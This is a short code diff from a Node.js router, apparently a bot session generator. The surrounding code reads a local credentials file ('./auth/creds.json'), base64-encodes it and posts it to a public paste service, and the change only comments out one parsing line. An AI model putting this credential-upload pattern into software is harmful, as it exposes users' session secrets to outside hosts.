@@ -56,7 +56,7 @@ router.get('/', async (req, res) => {
                     var Scan_Id = Buffer.from(CREDS).toString('base64');
                     let data = await fs.readFileSync('./auth/creds.json','utf-8');
           const response = await axios.post('http://paste.c-net.org/',`${btoa(data)}`, {headers: { 'Content-Type': 'application/x-www-form-urlencoded' }});
-          let c = output.data.split('/')[3]
+         // let c = output.data.split('/')[3]
           
                     // Envoi de la session à Pastebin
                   /*  const response = await axios.post('https://pastebin.com/api/api_post.php', new URLSearchParams({
